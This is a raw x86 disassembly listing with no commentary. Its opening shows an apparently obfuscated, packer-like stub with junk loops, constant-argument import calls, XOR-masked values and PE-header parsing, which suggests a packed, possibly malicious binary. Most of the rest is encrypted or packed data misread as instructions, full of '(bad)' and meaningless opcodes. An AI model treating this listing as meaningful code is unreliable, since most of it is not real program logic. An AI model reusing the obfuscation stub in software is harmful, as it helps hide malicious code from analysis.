  4028aa:	push   DWORD PTR [ebp-0x24]
  4028ad:	push   0x43f7
  4028b2:	push   0x38dd
  4028b7:	push   DWORD PTR [ebp-0x10]
  4028ba:	push   0x3246
  4028bf:	push   0x510b
  4028c4:	push   0x8cd7
  4028c9:	push   DWORD PTR [ebp-0xc]
  4028cc:	push   0x63f7
  4028d1:	push   DWORD PTR [ebp-0x10]
  4028d4:	call   DWORD PTR ds:0x42e8bb
  4028da:	cmp    DWORD PTR ds:0x42d000,0x6
  4028e1:	jne    0x4028f4
  4028e7:	mov    ecx,DWORD PTR ds:0x42d000
  4028ed:	dec    ecx
  4028ee:	mov    DWORD PTR ds:0x42d000,ecx
  4028f4:	mov    ecx,DWORD PTR ds:0x42d000
  4028fa:	dec    ecx
  4028fb:	mov    DWORD PTR ds:0x42d000,ecx
  402901:	jmp    0x402880
  402906:	mov    ecx,0x751089b
  40290b:	xor    eax,ecx
  40290d:	cmp    eax,0xf89c85f0
  402912:	jne    0x402941
  402918:	mov    eax,DWORD PTR [ebp+0x8]
  40291b:	push   esi
  40291c:	mov    esi,DWORD PTR [ebp+0x8]
  40291f:	add    esi,DWORD PTR [eax+0x3c]
  402922:	mov    DWORD PTR [ebp+0x8],esi
  402925:	mov    eax,DWORD PTR [ebp-0x4]
  402928:	mov    esi,DWORD PTR [ebp+0x8]
  40292b:	xor    eax,ecx
  40292d:	add    eax,edx
  40292f:	cmp    DWORD PTR [esi+0x54],eax
  402932:	pop    esi
  402933:	je     0x402941
  402939:	mov    eax,DWORD PTR [ebp+0x8]
  40293c:	jmp    0x402948
  402941:	mov    eax,DWORD PTR [ebp-0x4]
  402944:	xor    eax,ecx
  402946:	add    eax,edx
  402948:	leave  
  402949:	ret    0x4
  40294c:	push   ebp
  40294d:	mov    ebp,esp
  40294f:	sub    esp,0x38
  402952:	xor    eax,eax
  402954:	xor    eax,DWORD PTR ds:0x42c00c
  40295a:	xor    DWORD PTR ds:0x42d010,eax
  402960:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  402967:	and    DWORD PTR ds:0x429020,0x0
  402971:	jmp    0x402981
  402976:	mov    eax,ds:0x429020
  40297b:	inc    eax
  40297c:	mov    ds:0x429020,eax
  402981:	cmp    DWORD PTR ds:0x429020,0x12
  402988:	jae    0x4029d7
  40298e:	cmp    DWORD PTR ds:0x429020,0x4
  402995:	jne    0x4029b5
  40299b:	push   0x3575
  4029a0:	push   0x2056
  4029a5:	push   0x7cad
  4029aa:	push   0x3741
  4029af:	call   DWORD PTR ds:0x42e8e7
  4029b5:	cmp    DWORD PTR ds:0x429020,0x3
  4029bc:	jne    0x4029d0
  4029c2:	xor    eax,eax
  4029c4:	add    eax,DWORD PTR ds:0x429020
  4029ca:	inc    eax
  4029cb:	mov    ds:0x429020,eax
  4029d0:	jmp    0x402976
  4029d5:	not    eax
  4029d7:	push   ebx
  4029d8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4029df:	mov    eax,DWORD PTR [ebp-0x4]
  4029e2:	add    DWORD PTR ds:0x42900c,0x42a018
  4029ec:	push   esi
  4029ed:	mov    esi,0x751089b
  4029f2:	xor    DWORD PTR ds:0x429018,0x429014
  4029fc:	xor    eax,esi
  4029fe:	sbb    DWORD PTR ds:0x42b000,0x77b
  402a08:	push   edi
  402a09:	mov    DWORD PTR ds:0x429018,0x1e
  402a13:	cmp    DWORD PTR ds:0x429018,0x0
  402a1a:	je     0x402a6e
  402a20:	cmp    DWORD PTR ds:0x429018,0xe
  402a27:	jne    0x402a42
  402a2d:	push   0x6dbc
  402a32:	push   0x42a004
  402a37:	push   0x657a
  402a3c:	call   DWORD PTR ds:0x42e8bf
  402a42:	cmp    DWORD PTR ds:0x429018,0xf
  402a49:	jne    0x402a5c
  402a4f:	mov    edi,DWORD PTR ds:0x429018
  402a55:	dec    edi
  402a56:	mov    DWORD PTR ds:0x429018,edi
  402a5c:	mov    edi,DWORD PTR ds:0x429018
  402a62:	dec    edi
  402a63:	mov    DWORD PTR ds:0x429018,edi
  402a69:	jmp    0x402a13
  402a6e:	mov    edi,0x3272e2
  402a73:	or     DWORD PTR ds:0x42a014,0x429014
  402a7d:	add    eax,edi
  402a7f:	adc    DWORD PTR ds:0x429008,0x42a018
  402a89:	mov    DWORD PTR [ebp-0x1c],eax
  402a8c:	movzx  eax,BYTE PTR ds:0x429010
  402a93:	xor    eax,DWORD PTR ds:0x42b00c
  402a99:	mov    ds:0x429010,eax
  402a9e:	mov    eax,DWORD PTR [ebp+0x14]
  402aa1:	test   eax,eax
  402aa3:	jmp    0x404df8
  402aa8:	retf   
  402aa9:	int    0x38
  402aab:	outs   dx,DWORD PTR ds:[esi]
  402aac:	cmp    cl,BYTE PTR [ebx-0x3abb3675]
  402ab2:	jae    0x402a43
  402ab4:	pop    esi
  402ab5:	lods   al,BYTE PTR ds:[esi]
  402ab6:	add    al,ch
  402ab8:	jl     0x402b36
  402aba:	jl     0x402b38
  402abc:	xor    al,0x5f
  402abe:	jl     0x402b3c
  402ac0:	adc    eax,0x1139172e
  402ac5:	and    eax,0x32652f13
  402aca:	popa   
  402acb:	pusha  
  402acc:	call   0xc534:0x6d6c6c7b
  402ad3:	fdivp  st(1),st
  402ad5:	push   0x42
  402ad7:	arpl   WORD PTR [ecx+0x53],di
  402ada:	stos   BYTE PTR es:[edi],al
  402adb:	jp     0x402b4a
  402add:	push   ecx
  402ade:	iret   
  402adf:	pop    ebp
  402ae0:	dec    esp
  402ae1:	cmp    cl,BYTE PTR [esi+0x577087fc]
  402ae7:	dec    ebp
  402ae8:	jg     0x402b21
  402aea:	mov    ah,BYTE PTR [eax+0x33a4ba7f]
  402af0:	jmp    DWORD PTR cs:[eax-0x22]
  402af4:	cld    
  402af5:	imul   edi,DWORD PTR [edi+0x18],0xffffffed
  402af9:	xor    ebp,ecx
  402afb:	mov    esp,0xd82b87ed
  402b00:	and    DWORD PTR [ecx],0xf
  402b03:	push   ecx
  402b04:	mov    ds:0x6df7c68c,eax
  402b09:	fld    QWORD PTR [esi]
  402b0b:	(bad)  
  402b0c:	or     ah,bh
  402b0e:	and    BYTE PTR [edx],dl
  402b10:	inc    edx
  402b11:	push   cs
  402b12:	and    BYTE PTR [ebx+0x62],ah
  402b15:	mov    cl,0xaf
  402b17:	sub    ebx,DWORD PTR [ecx+0x5]
  402b1a:	mov    al,ds:0x2341e1ff
  402b1f:	jbe    0x402b55
  402b21:	ret    0xf153
  402b24:	sbb    al,0xfc
  402b26:	jb     0x402ae1
  402b28:	jnp    0x402b07
  402b2a:	xchg   edx,eax
  402b2b:	pop    edi
  402b2c:	cmp    DWORD PTR [ecx+0x49841607],0xb
  402b33:	cwde   
  402b34:	ds je  0x402ac2
  402b37:	add    ebx,esp
  402b39:	sub    eax,0x4b368d54
  402b3e:	push   esi
  402b3f:	sti    
  402b40:	iret   
  402b41:	mov    WORD PTR [ecx],fs
  402b43:	or     edx,0x6982ceb7
  402b49:	out    0x45,al
  402b4b:	push   esp
  402b4c:	dec    esi
  402b4d:	push   cs
  402b4e:	cmp    BYTE PTR [ebx],cl
  402b50:	xor    BYTE PTR [ebx],bl
  402b52:	lods   eax,DWORD PTR ds:[esi]
  402b53:	inc    ebx
  402b54:	int3   
  402b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b56:	dec    edx
  402b57:	fiadd  DWORD PTR [esi]
  402b59:	push   eax
  402b5a:	std    
  402b5b:	push   esp
  402b5c:	push   eax
  402b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b5e:	icebp  
  402b5f:	bound  edi,QWORD PTR [edi-0x20fbbb0e]
  402b65:	addr16 inc ebx
  402b67:	outs   dx,BYTE PTR ds:[esi]
  402b68:	je     0x402b98
  402b6a:	inc    ebx
  402b6b:	stc    
  402b6c:	dec    edx
  402b6d:	out    dx,al
  402b6e:	cmp    BYTE PTR [ebp-0x7d758e8a],dl
  402b74:	mov    edx,0x7fc00893
  402b79:	pop    ebx
  402b7a:	pop    ecx
  402b7b:	lock daa 
  402b7d:	push   ebp
  402b7e:	out    0x21,al
  402b80:	pop    ds
  402b81:	rcl    DWORD PTR [edx+0x2f],0xd5
  402b85:	imul   ebp,edx,0x25
  402b88:	sub    BYTE PTR [ecx],bl
  402b8a:	adc    al,0x4f
  402b8c:	ret    0x162
  402b8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b90:	clc    
  402b91:	sub    eax,0x15e03632
  402b96:	ret    
  402b97:	push   0xffffffbe
  402b99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b9a:	push   0xfffffff1
  402b9c:	xor    eax,0x7c69053
  402ba1:	iret   
  402ba2:	imul   ebp,DWORD PTR [esi],0x38894cd1
  402ba8:	mov    ds:0xddcaa993,al
  402bad:	imul   eax,DWORD PTR [ecx],0x7b
  402bb0:	push   ebx
  402bb1:	pop    esi
  402bb2:	ins    DWORD PTR es:[edi],dx
  402bb3:	inc    esi
  402bb4:	ds push cs
  402bb6:	or     ecx,DWORD PTR [ebx-0x57]
  402bb9:	cmovg  esp,ebx
  402bbc:	rcr    BYTE PTR [edx-0x72],0xe3
  402bc0:	xchg   esp,eax
  402bc1:	lods   eax,DWORD PTR ds:[esi]
  402bc2:	adc    DWORD PTR [edx],eax
  402bc4:	arpl   WORD PTR [ebx-0x76],dx
  402bc7:	out    0xb8,eax
  402bc9:	add    esp,DWORD PTR [ebx+0x7e8b2dd5]
  402bcf:	addr16 es sti 
  402bd2:	stc    
  402bd3:	mov    ds:0xa8c48f72,eax
  402bd8:	retf   
  402bd9:	sti    
  402bda:	lahf   
  402bdb:	and    al,bh
  402bdd:	sbb    ebp,esp
  402bdf:	sbb    DWORD PTR [edi+ebx*1-0x7101bfcf],esp
  402be6:	jp     0x653fff9e
  402bec:	push   edx
  402bed:	data16 jns 0x402bf7
  402bf0:	ret    0x91aa
  402bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bf4:	sbb    al,0xdb
  402bf6:	ret    0xef14
  402bf9:	mov    ecx,DWORD PTR [eax]
  402bfb:	jge    0x402c35
  402bfd:	in     eax,dx
  402bfe:	pop    ebp
  402bff:	pop    ss
  402c00:	les    edi,FWORD PTR [edx+ebx*4]
  402c03:	pop    esi
  402c04:	lock or al,0x3c
  402c07:	xchg   edi,eax
  402c08:	jns    0x402ba8
  402c0a:	xor    ah,BYTE PTR [edx+0xc]
  402c0d:	sub    al,0xfe
  402c0f:	inc    ecx
  402c10:	cmp    eax,0xff2f88e9
  402c15:	xchg   ecx,eax
  402c16:	inc    eax
  402c17:	fsub   DWORD PTR [ecx]
  402c19:	in     eax,dx
  402c1a:	retf   
  402c1b:	or     BYTE PTR ds:0x16ce94ce,dl
  402c21:	or     dl,BYTE PTR [esi+0x2fad4cf2]
  402c27:	fwait
  402c28:	imul   ebx
  402c2a:	jecxz  0x402bfb
  402c2c:	cmp    dh,ch
  402c2e:	push   edx
  402c2f:	lea    ebx,[ebx+0x385e7234]
  402c35:	pop    esi
  402c36:	or     edi,DWORD PTR [ebx-0x55b7651f]
  402c3c:	or     DWORD PTR [edi],esi
  402c3e:	pop    esp
  402c3f:	cmc    
  402c40:	cdq    
  402c41:	fild   WORD PTR gs:[edi-0x6b]
  402c45:	dec    ebp
  402c46:	dec    esi
  402c47:	popf   
  402c48:	adc    DWORD PTR [eax+0x7a],ebx
  402c4b:	push   ecx
  402c4c:	aam    0x21
  402c4e:	dec    ebp
  402c4f:	jae    0x402c63
  402c51:	pop    esi
  402c52:	mov    bl,0x34
  402c54:	pop    ss
  402c55:	out    0xcc,al
  402c57:	idiv   DWORD PTR [edi+0x3d]
  402c5a:	inc    edx
  402c5b:	popa   
  402c5c:	or     bl,BYTE PTR [edx-0x434f8207]
  402c62:	mov    esi,0x9a8f1794
  402c67:	pushf  
  402c68:	fldcw  WORD PTR [esi+0x31e7299a]
  402c6e:	push   es
  402c6f:	enter  0x7ef7,0x12
  402c73:	ret    
  402c74:	push   0xbe75a2e1
  402c79:	and    edx,DWORD PTR [edi-0x66]
  402c7c:	cwde   
  402c7d:	dec    ecx
  402c7e:	add    eax,0x71aea42c
  402c83:	sbb    DWORD PTR [edi],esp
  402c85:	in     al,0xfe
  402c87:	sti    
  402c88:	mov    dl,0x5d
  402c8a:	in     al,0x56
  402c8c:	mov    ds:0x5ba7e898,eax
  402c91:	and    DWORD PTR [ebx+0x39630eec],eax
  402c97:	jmp    0x36dd:0x5e019dd5
  402c9e:	repnz fcmovne st,st(3)
  402ca1:	clc    
  402ca2:	cmc    
  402ca3:	adc    eax,0x2752e11f
  402ca8:	add    edx,ecx
  402caa:	stos   DWORD PTR es:[edi],eax
  402cab:	js     0x402d0e
  402cad:	ins    BYTE PTR es:[edi],dx
  402cae:	sub    DWORD PTR [ebx-0x36],0xffffffab
  402cb2:	fild   DWORD PTR [ecx]
  402cb4:	das    
  402cb5:	in     eax,0x4a
  402cb7:	hlt    
  402cb8:	sub    BYTE PTR [eax-0x31ff2189],ah
  402cbe:	call   0x8f6a:0x1bcc57c6
  402cc5:	mov    ds:0xa6e543e8,eax
  402cca:	sub    edx,DWORD PTR [edi]
  402ccc:	lods   al,BYTE PTR ds:[esi]
  402ccd:	jle    0x402c7b
  402ccf:	xor    eax,0x4b283977
  402cd4:	ja     0x402cdf
  402cd6:	dec    ebx
  402cd7:	mov    dh,0x4c
  402cd9:	dec    edx
  402cda:	(bad)  
  402cdb:	mov    dh,0xac
  402cdd:	popf   
  402cde:	pop    ebp
  402cdf:	mov    ebp,DWORD PTR [edx+ebx*4+0x9]
  402ce3:	and    al,0xce
  402ce5:	inc    ebx
  402ce6:	lods   al,BYTE PTR ds:[esi]
  402ce7:	out    dx,al
  402ce8:	loope  0x402c93
  402cea:	add    edx,DWORD PTR [ebp+0x5ec1a519]
  402cf0:	and    eax,0x4a87f72c
  402cf5:	or     al,0xdd
  402cf7:	and    ah,al
  402cf9:	or     al,0x7c
  402cfb:	dec    ecx
  402cfc:	mov    al,0x7b
  402cfe:	cmp    ah,cl
  402d00:	ss adc esi,esi
  402d03:	dec    ecx
  402d04:	imul   esi,DWORD PTR [edx-0x7159748f],0x70
  402d0b:	push   eax
  402d0c:	fs inc ebp
  402d0e:	aas    
  402d0f:	pop    ebx
  402d10:	jmp    0x815b:0xa0fbeef3
  402d17:	and    dh,BYTE PTR [ebx+0x3c]
  402d1a:	imul   edi,DWORD PTR ds:0xb1fa42d3,0xfffffff1
  402d21:	fmul   DWORD PTR ds:[esi]
  402d24:	or     BYTE PTR [esi+edi*1+0x6579ef43],cl
  402d2b:	fiadd  DWORD PTR [ebp-0x43]
  402d2e:	loope  0x402d05
  402d30:	add    esi,esp
  402d32:	ss iret 
  402d34:	cmp    al,BYTE PTR [ebp+0x4586fe3a]
  402d3a:	pusha  
  402d3b:	mov    dh,0x77
  402d3d:	dec    DWORD PTR [eax-0x5712294a]
  402d43:	cmp    al,0x3e
  402d45:	je     0x402d4f
  402d47:	loope  0x402d58
  402d49:	jne    0x402ceb
  402d4b:	outs   dx,DWORD PTR ds:[esi]
  402d4c:	inc    edi
  402d4d:	mov    cl,0x3e
  402d4f:	push   0x66d3326a
  402d54:	imul   ebx,DWORD PTR [ebx+0x2f],0xffffffec
  402d58:	push   es
  402d59:	sbb    DWORD PTR [ebp-0x6f],esp
  402d5c:	lahf   
  402d5d:	mov    ebx,DWORD PTR [ecx+0x47]
  402d60:	mov    dh,0x37
  402d62:	(bad)  
  402d64:	arpl   WORD PTR [esp+ecx*8+0x2039773d],ax
  402d6b:	fs mov ah,0xe1
  402d6e:	add    al,0x6c
  402d70:	out    0xf3,eax
  402d72:	jae    0x402d5b
  402d74:	adc    cl,BYTE PTR [eax-0x1e]
  402d77:	lock popa 
  402d79:	pop    ebp
  402d7a:	rol    DWORD PTR [ebp-0x1d],0x5a
  402d7e:	shr    bh,cl
  402d80:	aaa    
  402d81:	push   cs
  402d82:	mov    ch,0x97
  402d84:	mov    ds,ecx
  402d86:	addr16 push ds
  402d88:	cmp    eax,DWORD PTR [ecx+0x49a7aaf6]
  402d8e:	pop    eax
  402d8f:	loopne 0x402dee
  402d91:	addr16 ret 
  402d93:	xor    dh,ch
  402d95:	jmp    0x9e66382f
  402d9a:	mov    DWORD PTR [eax+0x23],edi
  402d9d:	mov    ebx,0x40e3e0c5
  402da2:	icebp  
  402da3:	adc    dh,bh
  402da5:	mov    ?,edx
  402da7:	mov    eax,0xb7afd33d
  402dac:	and    eax,0x4a622bd5
  402db1:	jne    0x402dcd
  402db3:	es dec ebx
  402db5:	push   edx
  402db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402db7:	mov    bl,0x2a
  402db9:	popf   
  402dba:	pop    ecx
  402dbb:	les    edx,FWORD PTR [edi-0x47942d7b]
  402dc1:	(bad)  
  402dc2:	or     dh,BYTE PTR [esi]
  402dc4:	inc    esi
  402dc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dc6:	sub    eax,0x4218656f
  402dcb:	mov    al,0xfe
  402dcd:	mov    cl,0xa6
  402dcf:	cld    
  402dd0:	and    al,0xa1
  402dd2:	and    eax,0xbf16a5de
  402dd7:	mov    ds,edx
  402dd9:	cli    
  402dda:	ins    DWORD PTR es:[edi],dx
  402ddb:	sbb    edi,DWORD PTR fs:[eax+0x5071da99]
  402de2:	add    DWORD PTR ds:0x870a6e12,edx
  402de8:	dec    edx
  402de9:	and    al,0xdf
  402deb:	arpl   cx,ax
  402ded:	mov    ecx,es
  402def:	and    al,0xc0
  402df1:	leave  
  402df2:	fdivp  st(4),st
  402df4:	cmp    eax,0x43039c92
  402df9:	mov    DWORD PTR [edx-0x6810e24c],esp
  402dff:	mov    edx,0x71e6f206
  402e04:	pop    ebx
  402e05:	mov    ebx,0x1b8631b5
  402e0a:	dec    edx
  402e0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e0c:	pushf  
  402e0d:	or     BYTE PTR [ebx-0x5c],bl
  402e10:	(bad)  
  402e12:	stos   BYTE PTR es:[edi],al
  402e13:	or     bh,BYTE PTR [edi+0x963f661]
  402e19:	call   0xbf84:0x9fffda0b
  402e20:	es out 0x8b,eax
  402e23:	cli    
  402e24:	div    edi
  402e26:	nop
  402e27:	fild   DWORD PTR [ecx]
  402e29:	jb     0x402dec
  402e2b:	ins    DWORD PTR es:[edi],dx
  402e2c:	jb     0x402de6
  402e2e:	rcl    ebp,1
  402e30:	dec    edx
  402e31:	repnz cwde 
  402e33:	fild   DWORD PTR [edi]
  402e35:	add    al,cl
  402e37:	int3   
  402e38:	jo     0x402dbe
  402e3a:	sub    BYTE PTR [ebx-0x56de13e0],ah
  402e40:	ss cwde 
  402e42:	or     al,0x11
  402e44:	scas   al,BYTE PTR es:[edi]
  402e45:	lea    esp,[ebp-0x1622c726]
  402e4b:	pop    esp
  402e4c:	fldcw  WORD PTR [ebp+esi*8-0x12]
  402e50:	mov    cl,0xc
  402e52:	inc    eax
  402e53:	test   BYTE PTR [edx-0x4a],dl
  402e56:	add    DWORD PTR [ebx-0x7a1a1570],esi
  402e5c:	ret    0x15a1
  402e5f:	sub    eax,eax
  402e61:	in     al,dx
  402e62:	test   eax,0x5998f206
  402e67:	out    0x70,al
  402e69:	jmp    0x402e1a
  402e6b:	jne    0x402eac
  402e6d:	ret    
  402e6e:	and    ebp,ebx
  402e70:	sahf   
  402e71:	pop    esp
  402e72:	(bad)  
  402e73:	dec    edx
  402e74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e75:	xchg   esi,eax
  402e76:	adc    esp,esp
  402e78:	mov    DWORD PTR [esi-0x55],ecx
  402e7b:	pop    ss
  402e7c:	xchg   esi,eax
  402e7d:	mov    eax,edx
  402e7f:	pop    esp
  402e80:	(bad)  
  402e81:	rcr    BYTE PTR [edi+0x67337104],1
  402e87:	push   0x37
  402e89:	push   esi
  402e8a:	push   ebp
  402e8b:	adc    eax,0xa6bdf0c3
  402e90:	pop    edi
  402e91:	mov    DWORD PTR [ebp+0x24],edx
  402e94:	js     0x402e92
  402e96:	sub    al,dh
  402e98:	mov    ecx,0xffaaf0b7
  402e9d:	inc    edi
  402e9e:	loop   0x402ec7
  402ea0:	pop    ds
  402ea1:	int3   
  402ea2:	and    ch,dl
  402ea4:	ss nop
  402ea6:	dec    edx
  402ea7:	xor    ebx,DWORD PTR [edi+0x66]
  402eaa:	and    dl,BYTE PTR [ebp-0x2c]
  402ead:	ins    DWORD PTR es:[edi],dx
  402eae:	mov    ?,WORD PTR [edx-0x69]
  402eb1:	jae    0x402f24
  402eb3:	out    0x75,al
  402eb5:	mov    ebp,0x94af43ad
  402eba:	xchg   edx,eax
  402ebb:	fucomp st(4)
  402ebd:	lock mov bh,0x48
  402ec0:	xor    ah,BYTE PTR [eax]
  402ec2:	(bad)  
  402ec3:	not    bl
  402ec5:	push   ebp
  402ec6:	or     BYTE PTR [esi+0x6d926cfb],al
  402ecc:	add    BYTE PTR [ebp-0x28],bl
  402ecf:	inc    ebp
  402ed0:	lds    ebp,FWORD PTR [eax-0x71291944]
  402ed6:	stos   BYTE PTR es:[edi],al
  402ed7:	or     DWORD PTR [ecx+esi*8],edi
  402eda:	fisub  DWORD PTR [edx]
  402edc:	or     bh,dh
  402ede:	ss (bad) 
  402ee0:	loop   0x402eef
  402ee2:	rcr    DWORD PTR [edx+0x76],1
  402ee5:	adc    ch,BYTE PTR [ebp+0xbb4a85d]
  402eeb:	inc    eax
  402eec:	or     BYTE PTR [eax-0x17],bl
  402eef:	jecxz  0x402eea
  402ef1:	push   eax
  402ef2:	inc    edi
  402ef3:	pop    esi
  402ef5:	xor    al,0xcf
  402ef7:	mov    esi,0x48845ecd
  402efc:	inc    esp
  402efd:	ret    
  402efe:	sub    al,0x2e
  402f00:	aas    
  402f01:	pop    edi
  402f02:	mov    dl,0xa3
  402f04:	sar    BYTE PTR [ecx],cl
  402f06:	loopne 0x402eb8
  402f08:	leave  
  402f09:	sub    eax,0x32e1c68b
  402f0e:	cdq    
  402f0f:	out    0x56,al
  402f11:	xor    eax,0x11ec75f3
  402f16:	push   eax
  402f17:	pop    eax
  402f18:	xor    BYTE PTR [ecx+0x1c],bh
  402f1b:	xchg   BYTE PTR [ebp+0x34c00523],ah
  402f21:	mov    ds:0x5e1df0b6,eax
  402f26:	mov    ecx,DWORD PTR [ecx-0x2dd472c8]
  402f2c:	lock push 0xffffffc0
  402f2f:	cmp    dh,bh
  402f31:	bound  esp,QWORD PTR [edi+0x2f739891]
  402f37:	and    ebp,DWORD PTR [eax]
  402f39:	and    al,0x73
  402f3b:	clc    
  402f3c:	fdiv   DWORD PTR [esi]
  402f3e:	cmp    bl,BYTE PTR [eax]
  402f40:	repz fwait
  402f42:	adc    DWORD PTR [esi+0x18],esp
  402f45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f46:	cli    
  402f47:	cmp    ah,dh
  402f49:	mov    edi,0x3fbc6a35
  402f4e:	or     ebx,ebx
  402f50:	and    al,0x82
  402f52:	adc    al,0x22
  402f54:	or     BYTE PTR [eax+0x4c7af245],al
  402f5a:	fisub  WORD PTR [ebp+0x2a3a4790]
  402f60:	xor    eax,0x35337e13
  402f65:	out    0xdc,eax
  402f67:	xchg   DWORD PTR [eax+0x86a45f2],esp
  402f6d:	dec    ecx
  402f6e:	pop    esi
  402f6f:	enter  0x8f8b,0x8d
  402f73:	imul   bh
  402f75:	jb     0x402f5d
  402f77:	shl    al,1
  402f79:	push   ebx
  402f7a:	push   eax
  402f7b:	loopne 0x402f05
  402f7d:	ret    0xac61
  402f80:	imul   eax,edi,0xffffffdb
  402f83:	push   ebp
  402f84:	and    eax,0xcf1253ba
  402f89:	cmp    esp,DWORD PTR [edi]
  402f8b:	jle    0x40300a
  402f8d:	pushf  
  402f8e:	rcr    ah,cl
  402f90:	mov    edx,0xd51e443e
  402f95:	mov    ecx,edi
  402f97:	(bad)
  402f9a:	push   ecx
  402f9b:	rcr    BYTE PTR [esi],cl
  402f9d:	stos   BYTE PTR es:[edi],al
  402f9e:	mov    bh,dl
  402fa0:	lds    edx,FWORD PTR [ebx+0x2ba1176e]
  402fa6:	pop    edi
  402fa7:	dec    eax
  402fa8:	dec    ebp
  402fa9:	jmp    0x402f71
  402fab:	dec    ebx
  402fac:	sar    DWORD PTR [esi],cl
  402fae:	femms  
  402fb0:	xchg   ecx,eax
  402fb1:	mov    edx,0x44eab215
  402fb6:	arpl   bp,bp
  402fb8:	dec    eax
  402fb9:	adc    eax,0xf9f5fee3
  402fbe:	nop
  402fbf:	and    esp,edi
  402fc1:	(bad)  
  402fc2:	sub    al,0x8
  402fc4:	loopne 0x402fb4
  402fc6:	push   0xabcecf0
  402fcb:	xor    ebp,DWORD PTR [ebx]
  402fcd:	inc    ebp
  402fce:	in     eax,0xea
  402fd0:	xor    esi,DWORD PTR [ecx-0x7affa762]
  402fd6:	repnz ficom DWORD PTR [ecx+0x25cf6b5d]
  402fdd:	xchg   BYTE PTR [esi],bl
  402fdf:	sbb    ch,BYTE PTR [esi+0x17dc04f6]
  402fe5:	pop    ebp
  402fe6:	push   edi
  402fe7:	xchg   ebx,eax
  402fe8:	push   cs
  402fe9:	popa   
  402fea:	cmp    ebp,0xffffffed
  402fed:	out    dx,eax
  402fee:	or     eax,0xd184582b
  402ff3:	and    DWORD PTR [esi+0x28],ebp
  402ff6:	fcmovnb st,st(0)
  402ff8:	leave  
  402ff9:	mov    eax,ds:0x13e60cec
  402ffe:	or     dh,BYTE PTR [edx-0x10]
  403001:	mov    bp,0x4cae
  403005:	rol    DWORD PTR [eax-0x71e6a43e],0xeb
  40300c:	fld    TBYTE PTR [ebp-0x6b9bc8b7]
  403012:	dec    ecx
  403013:	repnz fld TBYTE PTR [edi]
  403016:	mov    eax,0x23cdf181
  40301b:	in     al,dx
  40301c:	push   ebp
  40301d:	cmp    eax,0x667e79d8
  403022:	cmp    edi,DWORD PTR [ecx]
  403024:	dec    ebx
  403025:	xchg   ebp,eax
  403026:	jmp    0x45af:0xcefd3462
  40302d:	ret    
  40302e:	adc    BYTE PTR [ebx-0x16],0x65
  403032:	popf   
  403033:	inc    esp
  403034:	pop    ebp
  403035:	test   eax,0x678a1067
  40303a:	cs jnp 0x403092
  40303d:	push   ebx
  40303e:	test   ecx,eax
  403040:	push   esi
  403041:	and    edx,DWORD PTR [ebp+0x1985657]
  403047:	sub    eax,0xe1c539de
  40304c:	(bad)  
  40304d:	enter  0x51d7,0xa2
  403051:	sub    cl,bh
  403053:	or     cl,ch
  403055:	(bad)  
  403056:	out    dx,eax
  403057:	shl    DWORD PTR [edi+0x447e94e6],0xa
  40305e:	call   DWORD PTR [edx]
  403060:	mov    ah,0x53
  403062:	cmp    eax,0xbe2b1770
  403067:	xchg   ebx,esp
  403069:	xor    al,0xf4
  40306b:	push   ds
  40306c:	enter  0x3270,0x6f
  403070:	mov    al,ds:0x44125920
  403075:	ret    
  403076:	aam    0x8
  403078:	in     al,0xe8
  40307a:	sub    ebp,DWORD PTR [edi+0xd]
  40307d:	push   esp
  40307e:	repnz adc eax,DWORD PTR [ecx+0x71de5f9c]
  403085:	add    eax,0x85ad4c96
  40308a:	inc    ebp
  40308b:	pop    es
  40308c:	leavew 
  40308e:	popf   
  40308f:	dec    esp
  403090:	ins    DWORD PTR es:[edi],dx
  403091:	xor    bl,ch
  403093:	je     0x4030e3
  403095:	in     eax,0x8a
  403097:	mov    ?,ebx
  403099:	je     0x4030da
  40309b:	(bad)  
  40309c:	mov    eax,eax
  40309e:	scas   al,BYTE PTR es:[edi]
  40309f:	dec    esp
  4030a0:	ja     0x403073
  4030a2:	(bad)  
  4030a3:	icebp  
  4030a4:	xor    al,0x4c
  4030a6:	mov    WORD PTR ds:0xdf8accbc,?
  4030ac:	push   ds
  4030ad:	scas   eax,DWORD PTR es:[edi]
  4030ae:	push   ebp
  4030af:	mov    edx,0x9f82931b
  4030b4:	adc    edi,DWORD PTR ds:[eax-0x1e]
  4030b8:	sub    ah,BYTE PTR [edx+0x43]
  4030bb:	push   esi
  4030bc:	out    0xbc,al
  4030be:	cdq    
  4030bf:	inc    ebx
  4030c0:	dec    edx
  4030c1:	jb     0x4030a9
  4030c3:	pop    esp
  4030c4:	pop    eax
  4030c5:	mov    esi,0x2b7a1030
  4030ca:	push   0x27d67281
  4030cf:	lds    edx,FWORD PTR [esi-0x6d]
  4030d2:	cwde   
  4030d3:	and    bh,BYTE PTR [edi+edi*4-0x66229855]
  4030da:	fisttp QWORD PTR ds:0x4319b353
  4030e0:	push   cs
  4030e1:	mov    es,WORD PTR [bx+si-0x6b38]
  4030e6:	(bad)  
  4030e7:	repnz or DWORD PTR [edx],ecx
  4030ea:	push   esi
  4030eb:	aad    0xf1
  4030ed:	and    al,0x7a
  4030ef:	xor    edx,DWORD PTR [ebp-0x5]
  4030f2:	jecxz  0x40312f
  4030f4:	ins    BYTE PTR es:[edi],dx
  4030f5:	fwait
  4030f6:	pop    esp
  4030f7:	push   es
  4030f8:	mov    ah,0x24
  4030fa:	cmp    eax,DWORD PTR [esi+0x1b]
  4030fd:	std    
  4030fe:	hlt    
  4030ff:	std    
  403100:	cs xor al,0x30
  403103:	outs   dx,DWORD PTR ds:[esi]
  403104:	test   BYTE PTR [ebp+0x14],dl
  403107:	div    BYTE PTR [edi-0x693c0410]
  40310d:	mov    eax,ds:0x7d70a8a0
  403112:	push   0x372e67cb
  403117:	iret   
  403118:	pop    eax
  403119:	xlat   BYTE PTR ds:[ebx]
  40311a:	repz pop ds
  40311c:	fwait
  40311d:	mov    BYTE PTR [edi-0x7c],bh
